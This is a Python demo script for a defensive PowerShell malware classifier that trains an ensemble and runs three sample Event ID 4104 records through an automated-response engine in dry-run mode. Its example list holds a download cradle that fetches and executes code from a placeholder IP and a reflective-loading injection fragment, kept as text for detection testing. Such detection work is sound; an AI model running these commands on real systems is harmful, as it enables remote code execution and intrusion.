"""Short end-to-end demo for the video presentation (about 2 minutes).

1. loads and cleans the MPSD corpus,
2. trains the ensemble (char TF-IDF + LR, hand-crafted + RF) on four of the
   five family-aware folds and evaluates it on the held-out fold,
3. sends three example Event ID 4104 records through the response engine
   in dry-run mode.

Scripts are treated only as text and are never executed.
Usage:  python demo/demo_pipeline.py --data data/mpsd
"""
from __future__ import annotations

import argparse
import json
import os
import sys
import time

import numpy as np
from sklearn.metrics import confusion_matrix, f1_score, precision_score, recall_score
from sklearn.model_selection import StratifiedGroupKFold

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))
from psdetect.data import load_mpsd  # noqa: E402
from psdetect.models import SEED, SoftVotingEnsemble  # noqa: E402
from psdetect.response import ResponseEngine  # noqa: E402

EXAMPLES = [
    ("Admin script (benign)",
     "<#\n.SYNOPSIS\nLists running services.\n#>\nfunction Get-RunningService {\n"
     "    param([string]$Name = '*')\n    Get-Service -Name $Name | Where-Object Status -eq 'Running'\n}\n"),
    ("Download cradle",
     "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')"),
    ("Injection-style loader",
     "[DllImport(\"kernel32.dll\")] VirtualAlloc CreateThread "
     "$b=[System.Convert]::FromBase64String($p); [System.Reflection.Assembly]::Load($b)"),
]


def line(title):
    print("\n" + "=" * 70 + f"\n {title}\n" + "=" * 70, flush=True)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--data", default="data/mpsd")
    args = ap.parse_args()

    line("STEP 1  Load and clean the MPSD dataset")
    df, rep = load_mpsd(args.data)
    print(f"raw files             : {rep.raw_counts}")
    print(f"exact duplicates      : {rep.exact_duplicates_removed} removed")
    print(f"label conflicts       : {rep.label_conflicts_removed} removed")
    print(f"after cleaning        : {rep.final_counts}")
    print(f"near-duplicate groups : {rep.skeleton_groups}")

    line("STEP 2  Train the ensemble (family-aware split, fold 5 held out)")
    texts, y, groups = df["text"].tolist(), df["label"].to_numpy(), df["group"].to_numpy()
    tr, te = list(StratifiedGroupKFold(5, shuffle=True, random_state=SEED).split(texts, y, groups))[4]
    print(f"training scripts: {len(tr)}   held-out test scripts: {len(te)}")
    t0 = time.perf_counter()
    model = SoftVotingEnsemble().fit([texts[i] for i in tr], y[tr])
    print(f"training time   : {time.perf_counter() - t0:.1f} s")
    p = model.predict_proba([texts[i] for i in te])[:, 1]
    yhat = (p >= 0.5).astype(int)
    tn, fp, fn, tp = confusion_matrix(y[te], yhat).ravel()
    print(f"precision {precision_score(y[te], yhat):.3f} | recall {recall_score(y[te], yhat):.3f} "
          f"| F1 {f1_score(y[te], yhat):.3f} | false-positive rate {fp / (fp + tn):.4f}")
    print(f"confusion matrix: TN={tn} FP={fp} FN={fn} TP={tp}")

    line("STEP 3  Automated response on Event ID 4104 records (dry run)")
    engine = ResponseEngine(model, dry_run=True)
    for i, (name, text) in enumerate(EXAMPLES):
        event = {"EventID": 4104, "ScriptBlockId": f"demo-{i + 1}", "ScriptBlockText": text,
                 "Computer": f"WS-0{i + 1}", "ProcessId": 4100 + i, "Path": f"C:\\Users\\Public\\demo{i + 1}.ps1"}
        d = engine.handle(event)
        print(f"\n[{name}]  score={d.score:.3f}  tier={d.tier}  latency={d.latency_ms} ms")
        print("  ATT&CK  :", ", ".join(f"{t['id']} {t['name']}" for t in d.techniques) or "-")
        print("  actions :", ", ".join(f"{a['type']} ({a['status']})" for a in d.actions))
        if d.iocs["urls"] or d.iocs["ips"]:
            print("  IOCs    :", json.dumps(d.iocs))
        if d.analyst_approval_required:
            print("  >> host isolation is waiting for analyst approval")


if __name__ == "__main__":
    main()
